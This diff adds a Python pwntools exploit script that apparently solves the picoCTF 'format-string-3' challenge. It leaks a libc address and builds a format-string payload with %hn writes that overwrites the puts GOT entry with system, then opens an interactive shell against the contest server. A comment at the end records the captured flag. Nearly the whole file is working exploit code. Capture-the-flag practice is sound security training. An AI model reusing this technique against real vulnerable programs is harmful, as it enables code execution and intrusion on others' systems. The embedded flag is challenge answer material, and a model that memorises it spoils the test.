@@ -1,0 +1,36 @@
+from pwn import *
+
+# GOT overwrite the puts func address to system func address by formatstring bug
+
+p = remote("rhea.picoctf.net", 55809)
+#p = process("./format-string-3_patched")
+
+e = ELF("./format-string-3_patched")
+libc = ELF("./libc.so.6")
+
+p.recvuntil("Okay I'll be nice. Here's the address of setvbuf in libc: ")
+s = p.recv().decode("utf-8")
+saddr = int(s, 16)
+
+libbase = saddr - libc.symbols['setvbuf']
+sys = libbase + libc.symbols['system']
+puts_got = e.got['puts']
+
+print(hex(sys))
+
+l = []
+l.append([sys & 0xffff, 0])
+sys = sys >> 16
+l.append([sys & 0xffff, 2])
+sys = sys >> 16
+l.append([sys & 0xffff, 4])
+l = sorted(l, key = lambda x: x[0])
+
+payload  = f'%{l[0][0]}c%46$hn'.encode()
+payload += f'%{l[1][0] - l[0][0]}c%47$hn'.encode()
+payload += f'%{l[2][0] - l[1][0]}c%48$hn'.encode()
+payload = payload.ljust(0x40, b'A') + p64(puts_got + l[0][1]) + p64(puts_got + l[1][1]) + p64(puts_got + l[2][1])
+
+p.sendline(payload)
+p.interactive()
+#picoCTF{G07_G07?_4bae6df5}
